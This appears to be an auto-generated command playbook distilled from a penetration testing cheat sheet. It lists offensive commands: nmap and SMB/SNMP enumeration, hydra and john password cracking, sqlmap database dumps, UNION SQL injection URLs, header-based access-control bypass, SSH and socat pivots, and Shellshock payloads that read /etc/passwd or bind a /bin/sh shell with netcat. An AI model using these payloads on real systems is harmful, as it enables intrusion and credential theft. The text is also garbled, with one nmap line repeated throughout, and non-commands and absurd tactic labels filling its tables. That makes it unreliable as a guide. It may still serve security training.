---
title: "Trained Command Playbook: Penetration Testing Tools Cheat Sheet.html"
category: commands
domain_hub: "[[knowledge/08_web_api_sql_injection_and_active_reconnaissance]]"
os_platform: cross-platform
primary_tactic: Active_Enum
summary: "Verified Windows & Linux command playbook for Penetration Testing Tools Cheat Sheet.html (Active_Enum): Active network & port reconnaissance (nmap, Test-NetConnection), HTTP/HTTPS/REST/GraphQL/mTLS probing (curl, openssl s_client, Invoke-W"
when_to_apply: "Apply when working with Penetration Testing Tools Cheat Sheet.html (cross-platform): Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards."
tags: [active_enum, arp, covert_exfil, credential_access, cve-2014-6271, enumeration, eth0, hashcat, html, http, https, impacket, initial_access_exploitation, john, lateral_movement_routing_pivot, mdp, mimikatz, netstat, nmap, passive_enum, powershell, privilege_escalation]
source_file: "Penetration Testing Tools Cheat Sheet.html"
updated: 2026-10-30
---

nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# Trained Command Playbook: `Penetration Testing Tools Cheat Sheet.html`
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
- **Source Document:** `~/Projects/CORA/Training/Penetration Testing Tools Cheat Sheet.html`
- **CEGAR Verified Commands:** `148` (`0` malformed/unsafe snippets filtered)
- **MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`):** `148`
- **Discovered IPs/Subnets:** `0.0.0.0, 10.0.0.0, 10.255.255.255, 127.0.0.0, 127.0.0.1, 127.255.255.255, 128.0.0.0, 172.16.0.0, 172.31.255.255, 191.255.255.255, 192.0.0.0, 172.24.0.0, 172.24.0.1, 172.24.1.0/24, 172.24.1.1, 172.24.1.100, 172.24.1.108, 172.24.1.156, 172.24.1.200, 172.24.11.200, 172.24.2.1, 172.24.255.255, 172.24.99.131, 223.255.255.255, 224.0.0.0, 239.255.255.255, 240.0.0.0, 255.0.0.0, 255.128.0.0, 255.192.0.0, 255.224.0.0, 255.240.0.0, 255.248.0.0, 255.252.0.0, 255.254.0.0, 255.255.0.0, 255.255.128.0, 255.255.192.0, 255.255.224.0, 255.255.240.0, 255.255.248.0, 255.255.252.0, 255.255.254.0, 255.255.255.0, 255.255.255.128, 255.255.255.192, 255.255.255.224, 255.255.255.240, 255.255.255.249, 255.255.255.252, 255.255.255.254, 255.255.255.255, 77.1.2.25`
- **Discovered Interfaces:** `eth0`
- **Related Knowledge Note:** [[knowledge/trained_penetration_testing_tools_cheat_sheet]]
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
## Distilled MDP Tactical Transitions (`Tactic -> Technique -> Tool -> Command`)
| Pre-State ($s$) | Tactic ($\tau$) | Technique ($k$) | Tool ($u$) | Post-State ($s'$) | Verified Command ($c$) |
| :--- | :--- | :--- | :--- | :--- | :--- |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `ifconfig` | `s_passive_topology_mapped` | `ifconfig eth0 xxx.xxx.xxx.xxx/24` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `whois` | `s_passive_topology_mapped` | `whois domain-name-here.com` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nc` | `s_active_services_enumerated` | `nc -v 172.24.1.1 25` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `telnet` | `s_cross_subnet_pivot_routed` | `telnet 172.24.1.1 25` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `nbtscan` | `s_credentials_or_certs_acquired` | `nbtscan 172.24.1.0/24` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `netcat` | `s_initial_shell_or_api_access` | `netcat -nvlp 443` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `plink` | `s_protocol_chain_established` | `plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `git` | `s_active_services_enumerated` | `git clone https://github.com/nccgroup/vlan-hopping.git` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `chmod` | `s_interactive_tty_or_priv_escalated` | `chmod 700 frogger.sh` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `apt-get` | `s_covert_exfil_verified` | `apt-get -y install ruby-dev git make g++` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `nslookup` | `s_passive_topology_mapped` | `nslookup -> set type=any -> ls -d blah.com` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `dig` | `s_passive_topology_mapped` | `dig a domain-name-here.com @nameserver` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nc` | `s_active_services_enumerated` | `nc TARGET-IP 80` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `net` | `s_cross_subnet_pivot_routed` | `net use \\TARGET\IPC$ "" /u:""` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `enum4linux` | `s_credentials_or_certs_acquired` | `enum4linux -a target-ip` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `searchsploit` | `s_initial_shell_or_api_access` | `searchsploit -u` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `ssh` | `s_protocol_chain_established` | `ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `frogger.sh` | `s_active_services_enumerated` | `./frogger.sh` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `gcc` | `s_interactive_tty_or_priv_escalated` | `gcc -o exploit exploit.c` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `gem` | `s_covert_exfil_verified` | `gem install bundler` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `nmap` | `s_passive_topology_mapped` | `nmap -v -sS -A -T4 target` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `dig` | `s_passive_topology_mapped` | `dig mx domain-name-here.com @nameserver` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nmap` | `s_active_services_enumerated` | `nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 172.24.1.X` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `nbtscan` | `s_cross_subnet_pivot_routed` | `nbtscan Cheat Sheet` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `smbclient` | `s_credentials_or_certs_acquired` | `smbclient -L //172.24.1.100` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `wget` | `s_initial_shell_or_api_access` | `wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `ssh` | `s_protocol_chain_established` | `ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `udp-protocol-scanner.pl` | `s_active_services_enumerated` | `./udp-protocol-scanner.pl -p ike TARGET(s)` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `gcc` | `s_interactive_tty_or_priv_escalated` | `gcc -m32 exploit.c -o exploit` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `git` | `s_covert_exfil_verified` | `git clone https://github.com/iagox86/dnscat2.git` |
| `s_init_unknown` | **`Passive_Enum`** | Local Host State, Memory/Artifact Forensics, Process, Registry & Socket Survey | `nmap` | `s_passive_topology_mapped` | `nmap -v -sS -p--A -T4 target` |
| `s_init_unknown` | **`Reconnaissance`** | Domain, DNS, OSINT & Target Footprint Reconnaissance | `dig` | `s_passive_topology_mapped` | `dig axfr domain-name-here.com @nameserver` |
| `s_passive_topology_mapped` | **`Active_Enum`** | Active Network, Cloud, Directory Service & Endpoint Probing | `nmap` | `s_active_services_enumerated` | `nmap -sU TARGET` |
| `s_firewall_or_acl_unlocked` | **`Lateral_Movement_Routing_Pivot`** | Remote Host Execution, L2/L3 Route Injection & Subnet Pivot | `enum4linux` | `s_cross_subnet_pivot_routed` | `enum4linux Cheat Sheet` |
| `s_active_services_enumerated` | **`Credential_Access`** | Credential, Account, Kerberos Ticket, Hash Cracking & Certificate Operations | `nmap` | `s_credentials_or_certs_acquired` | `nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 172.24.1.0/24` |
| `s_active_services_enumerated` | **`Initial_Access_Exploitation`** | Structured Query / Payload / Web API Endpoint Exploitation | `gcc` | `s_initial_shell_or_api_access` | `gcc -m32 -o output32 hello.c (32 bit)` |
| `s_credentials_or_certs_acquired` | **`Protocol_Chaining`** | Multi-Protocol Handshake & Tunnel Relay Chaining | `proxychains` | `s_protocol_chain_established` | `proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2` |
| `s_l2_l3_verified` | **`Enumeration`** | General System & Service Enumeration | `udp-protocol-scanner.pl` | `s_active_services_enumerated` | `./udp-protocol-scanner.pl -p ike -f ip.txt` |
| `s_initial_shell_or_api_access` | **`Privilege_Escalation`** | ACL/Permission Modification, Service Abuse & Privilege Escalation | `gcc` | `s_interactive_tty_or_priv_escalated` | `gcc -o suid suid.c` |
| `s_interactive_tty_or_priv_escalated` | **`Covert_Exfil`** | Encapsulated / Low-Signature Data Telemetry Transfer | `searchsploit` | `s_covert_exfil_verified` | `searchsploit windows 2003 \| grep -i local` |
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
## Verified Executable Commands (Grouped by Capability Layer)
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
### General_System (100 commands)
```bash
whois domain-name-here.com
dig a domain-name-here.com @nameserver
dig mx domain-name-here.com @nameserver
dig axfr domain-name-here.com @nameserver
nslookup -> set type=any -> ls -d blah.com
dig axfr blah.com @ns1.blah.com
./SimplyEmail.py -all -e TARGET-DOMAIN
ls /usr/share/nmap/scripts/* | grep ftp
./udp-protocol-scanner.pl -f ip.txt
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U "" target
enum4linux target
nbtscan 172.24.1.0/24
enum4linux -a target-ip
smbclient -L //172.24.1.100
python /usr/share/doc/python-impacket-doc/examples
net use \\TARGET\IPC$ "" /u:""
smbclient -L //172.24.99.131
apt-get install nbtscan-unixwiz
python Responder.py -i local-ip -I eth0
apt-get install snmp-mibs-downloader download-mibs
echo "" > /etc/snmp/snmp.conf
snmpwalk -c public -v1 172.24.1.X 1|  grep hrSWRunName|cut -d* * -f
onesixtyone -c names -i hosts
apt-get install snmp snmp-mibs-downloader
./testssl.sh -e -E -f -p -y -Y -S -P -c -H -U TARGET-HOST | aha > OUTPUT-FILE.html
apt-get update
apt-get dist-upgrade -y
apt-get install openvas
apt-get install oscanner
apt-get install tnscmd10g
plink.exe -P 22 -l root -pw "1337" -R 445:127.0.0.1:445 REMOTE-IP
chmod 700 frogger.sh
./frogger.sh
./udp-protocol-scanner.pl -p ike TARGET(s)
./udp-protocol-scanner.pl -p ike -f ip.txt
pip install pyip
./ikeforce.py TARGET-IP -e -w wordlists/groupnames.dic
./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1
./udp-protocol-scanner.pl -p ike SUBNET/24
apt-get -y install ruby-dev git make g++
gem install bundler
searchsploit windows 2003 | grep -i local
grep -R "W7" /usr/share/metasploit-framework/modules/exploit/windows/*
searchsploit -u
searchsploit apache 2.2
searchsploit "Linux Kernel"
searchsploit linux 2.6 | grep -i ubuntu | grep local
gcc -m32 -o output32 hello.c (32 bit)
gcc -m64 -o output hello.c (64 bit)
./shocker.py -H TARGET  --command "/bin/cat /etc/passwd" -c /cgi-bin/status --verbose
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n" | nc TARGET 80
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
mount 172.24.1.1:/vol/share /mnt/nfs
mount -t cifs -o username=user,password=pass,domain=blah //172.24.1.X/share-name /mnt/cifs
net use Z: \\win-server\share password  /user:domain\janedoe /savecred /p:no
apt-get install smb4k -y
python /usr/share/doc/python-impacket-doc/examples/samrdump.py 172.24.XXX.XXX
snmpwalk public -v1 172.24.X.XXX 1 |grep 77.1.2.25 |cut -d" " -f4
python /usr/share/doc/python-impacket-doc/examples/samrdump.py SNMP 172.24.X.XXX
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 172.24.X.XXX ftp -V
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 172.24.X.XXX pop3 -V
hydra -P /usr/share/wordlistsnmap.lst 172.24.X.XXX smtp -V
john --wordlist=/usr/share/wordlists/rockyou.txt hashes
john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt
john --format=descrypt hash --show
gcc -o exploit exploit.c
gcc -m32 exploit.c -o exploit
gcc -o suid suid.c
gcc -m32 -o suid suid.c
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
perl -e 'exec "/bin/sh";'
show running-config
show ip interface
show ip route
dir all-filesystems
dir /all
Vi Cheat Sheet
nbtscan Cheat Sheet
enum4linux Cheat Sheet
WHOIS enumeration
NBTScan unixwiz
Plink.exe Tunnel
GCC Compile 32Bit Exploit on 64Bit Kali
snmpwalk -c public -v1 172.24.1.X 1| grep hrSWRunName|cut -d* * -f
Find exploits for enumerated hosts / services.
grep -R "W7" /usr/share/metasploit-framework
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
mount -t cifs -o username=user,password=pass
net use Z: \\win-server\share password
snmpwalk public -v1 172.24.X.XXX 1 |grep 77.1.2.25
python /usr/share/doc/python-impacket-doc/examples/
samrdump.py SNMP 172.24.X.XXX
hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f
john --format=descrypt --wordlist
```
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
### L2_ARP_Link (1 commands)
```bash
git clone https://github.com/nccgroup/vlan-hopping.git
```
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
### L3_Routing_NAT (2 commands)
```bash
ifconfig eth0 xxx.xxx.xxx.xxx/24
IP Address Range
```
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
### L4_Port_Service (25 commands)
```bash
nc -v 172.24.1.1 25
telnet 172.24.1.1 25
nc TARGET-IP 80
nmap -v -sS -A -T4 target
nmap -v -sS -p--A -T4 target
nmap -v -sU -sS -p- -A -T4 target
nmap -v -p 445 --script=smb-check-vulns --script-args=unsafe=1 172.24.1.X
nmap -sU TARGET
nmap -T4 -v -oA shares --script smb-enum-shares --script-args smbuser=username,smbpass=password -p445 172.24.1.0/24
nmap -sU -sS --script=smb-enum-users -p U:137,T:139 172.24.11.200-254
nmap -sV -p 161 --script=snmp-info TARGET-SUBNET
netstat -tulpn
nmap --script=oracle-tns-version
nmap --script=oracle-sid-brute
nmap --script=oracle-brute
nmap -p 1521 -A TARGET
netcat -nvlp 443
nmap -sU --script=ms-sql-info 172.24.1.108 172.24.1.156
ssh -D 127.0.0.1:1010 -p 22 user@pivot-target-ip
ssh -D 127.0.0.1:1010 -p 22 user1@ip-address-1
proxychains ssh -D 127.0.0.1:1011 -p 22 user1@ip-address-2
nmap -Pn -sV -p 1723 TARGET(S)
nc -l -p 443
nmap -sT -p 161 172.24.X.XXX/254 -oG snmp_results.txt (then grep)
nmap -sT -p 161 172.24.X.XXX/254 -oG snmp_results.txt
```
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
### L7_HTTP_Web (20 commands)
```bash
git clone https://github.com/killswitch-GUI/SimplyEmail.git
git clone https://github.com/portcullislabs/udp-proto-scanner.git
git clone https://github.com/SpiderLabs/Responder.git
wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb
git clone https://github.com/SpiderLabs/ikeforce.git
git clone https://github.com/iagox86/dnscat2.git
wget -O mingw-get-setup.exe http://sourceforge.net/projects/mingw/files/Installer/mingw-get-setup.exe/download
wget http://gojhonny.com/misc/mingw_bin.zip && unzip mingw_bin.zip
git clone https://github.com/nccgroup/shocker
nikto -h 172.24.1.1
sqlmap -u http://meh.com --forms --batch --crawl=10  --cookie=jsessionid=54321 --level=5 --risk=3
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE  --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"
sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump
sqlmap -o -u "http://meh.com/form/" --forms
sqlmap -o -u "http://meh/vuln-form" --forms  -D database-name -T users --dump
sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3
sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read="/var/www/blah.php"
sqlmap check form for injection
sqlmap -o -u "http://meh/vuln-form" --forms -D database-name -T users --dump
sqlmap dump and crack hashes for table users on database-name.
```
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>

<!-- CORA-MAXIMIZED-COMMANDS-START -->
## Maximized Windows & Linux Command Examples for `Penetration Testing Tools Cheat Sheet.html`

> **Domain Hub:** [[knowledge/08_web_api_sql_injection_and_active_reconnaissance|Domain Hub 08: Active Reconnaissance (nmap), Web/API/mTLS Probing (curl / openssl), SQL Injection Cheat Sheets & Operator Playbooks]]  
> **Master Playbooks:** [[commands/windows_master_command_playbook]] | [[commands/linux_master_command_playbook]] | [[commands/curl_playbook]] | [[commands/tio_serial_playbook]]  
> **When to Apply:** Apply when scanning a reachable target IP/subnet (`nmap`), probing web servers or appliance management ports (`curl`/`openssl s_client`), extracting TLS certificate hardware serials and HTTP `Last-Modified` firmware dates, testing SQL injection vectors (`UNION`, error-based, time-based blind), or establishing SSH/socat port forwards.  
> **15-Engine H-MDP State Transition:** `s_l2_l3_verified` $\xrightarrow{\text{Active_Enum}}$ `s_initial_shell_or_api_access` | **Bayesian Root-Cause Triggers:** `service_on_nonstandard_port_or_tls, missing_auth_or_mtls_cert, reverse_proxy_ip_acl_block, sql_injection_or_input_validation_flaw` | **Isolation:** `RED, BLUE (Allowed LAN/USB interfaces; blocked in WHITE air-gap mode except against local files/loopback)`

| Primary Command (`Windows` / `Linux`) | OS / Shell | What It Does & Key Flags | When to Apply & Expected Output | Cross-Platform Equivalent |
| :--- | :--- | :--- | :--- | :--- |
| `nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>` | **Linux / Windows** | Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`). | Apply once L2/L3 reachability to `<TARGET_IP>` is verified (`s_l2_l3_verified -> s_active_services_enumerated`). | `powershell -NoProfile -Command "80,443,445,3389,5985,8080,8443 \| ForEach-Object { Test-NetConnection <TARGET_IP> -Port $_ }"` |
| `curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"` | **Linux / Windows** | Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`). | Apply to inspect HTTP headers (`Server`, `Last-Modified`, `ETag`, `Set-Cookie`) and login page markers. | `curl.exe -sS -k -L -i --max-time 15 "https://<TARGET_IP>/"` |
| `echo \| openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null \| openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName` | **Linux / Windows** | Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names. | Apply on HTTPS endpoints (443/8443/10443): appliances like Fortinet FortiGate expose their exact hardware model & serial (`CN = FG...`) in the TLS certificate! | `echo "" \| openssl.exe s_client -connect <TARGET_IP>:443 2>NUL \| openssl.exe x509 -noout -subject -issuer -dates` |
| `curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` | **Linux / Windows** | Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`). | Apply to determine exact appliance firmware build dates from static asset `Last-Modified` timestamps and map applicable CVEs. | `curl.exe -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"` |
| `curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` | **Linux / Windows** | Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake. | Apply when an API endpoint returns `SSL alert bad certificate` or `400 No required SSL certificate was sent` (`CBR-004`). | `curl.exe -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"` |
| `curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"` | **Linux / Windows** | Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses. | Apply when an endpoint behind Nginx/Apache/HAProxy returns `403 Forbidden` to external IPs (`reverse_proxy_ip_acl_block`). | `curl.exe -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" "https://<TARGET_IP>/admin"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,version(),user(),database()--%20-"` | **Linux / Windows** | Tests `UNION SELECT` SQL injection to extract DBMS version (`@@version` / `version()`), current DB user, and schema name (`[[knowledge/trained_sql_injection_cheat_sheet_by_netsparker]]`). | Apply during authorized web application security testing when an input parameter interacts with a SQL query. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item.php?id=-1%20UNION%20SELECT%201,@@version,user(),database()--%20-"` |
| `curl -sS -k -L --max-time 15 "http://<TARGET_IP>/ item?id=1%20UNION%20SELECT%20FIRST%201%20tabname%20FROM%20systables--"` | **Linux / Windows** | IBM Informix SQL injection enumeration querying `systables` and `syscolumns` (`[[knowledge/trained_informix-sql-injection-cheat-sheet]]`). | Apply when target database errors or banners indicate IBM Informix Dynamic Server. | `curl.exe -sS -k -L --max-time 15 "http://<TARGET_IP>/item?id=1%20UNION%20SELECT%20DBINFO('version','full')%20FROM%20systables%20WHERE%20tabid=1--"` |
| `ssh -o StrictHostKeyChecking=no -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` | **Linux / Windows** | Establishes a local SSH port forward (`-L`) mapping local `127.0.0.1:8443` to `<TARGET_IP>`'s internal loopback `127.0.0.1:8080` (`[[knowledge/trained_penetration_testing_tools_cheat_sheet]]`). | Apply when `ss -tulpn` / `netstat -ano` shows an internal service bound exclusively to `127.0.0.1:8080` on `<TARGET_IP>`. | `ssh.exe -N -L 127.0.0.1:8443:127.0.0.1:8080 <USER>@<TARGET_IP>` |
| `socat TCP-LISTEN:8443,fork,reuseaddr TCP:<SECONDARY_IP>:443` | **Linux Bash** | Creates a bidirectional userland TCP relay forwarding connections on port `8443` to downstream `<SECONDARY_IP>:443`. | Apply on a pivot host when kernel `ip_forward` or `iptables` NAT cannot be modified (e.g., inside an unprivileged container). | `netsh interface portproxy add v4tov4 listenport=8443 connectaddress=<SECONDARY_IP> connectport=443` |

### Copy-Pasteable Execution Block (Windows & Linux)
```bash
# [Linux / Windows] Probes key enterprise, database, and appliance management ports skipping ping (`-Pn`), running service version detection (`-sV`) and default scripts (`-sC`).
nmap -sV -sC -Pn -T4 -p 21,22,23,53,80,111,135,139,443,445,1433,1521,3306,3389,5432,5985,8000,8080,8443,10443 <TARGET_IP>
# [Linux / Windows] Fetches HTTP response headers (`-i`) and HTML body following redirects (`-L`) and accepting self-signed TLS certs (`-k`) (`[[commands/curl_playbook]]`).
curl -sS -k -L -i --connect-timeout 5 --max-time 15 "https://<TARGET_IP>/"
# [Linux / Windows] Extracts X.509 TLS certificate `Subject` (`CN`), `Issuer`, validity window, serial number, and `SAN` DNS names.
echo | openssl s_client -connect <TARGET_IP>:443 -servername <TARGET_IP> 2>/dev/null | openssl x509 -noout -subject -issuer -dates -serial -ext subjectAltName
# [Linux / Windows] Sends an HTTP `HEAD` request to retrieve static asset/login headers (`Last-Modified`, `ETag`, `Content-Length`).
curl -sS -k -L -I --max-time 15 "https://<TARGET_IP>/login"
# [Linux / Windows] Presents a Mutual TLS (`mTLS`) client certificate (`--cert`) and private key (`--key`) during the TLS handshake.
curl -sS -k -L --max-time 15 --cert client.crt --key client.key "https://<TARGET_IP>:8443/api/v1/status"
# [Linux / Windows] Injects reverse-proxy client IP headers (`X-Forwarded-For`, `X-Real-IP`) to test IP-based access control bypasses.
curl -sS -k -L -i --max-time 15 -H "X-Forwarded-For: 127.0.0.1" -H "X-Real-IP: 127.0.0.1" "https://<TARGET_IP>/admin"
```
<!-- CORA-MAXIMIZED-COMMANDS-END -->
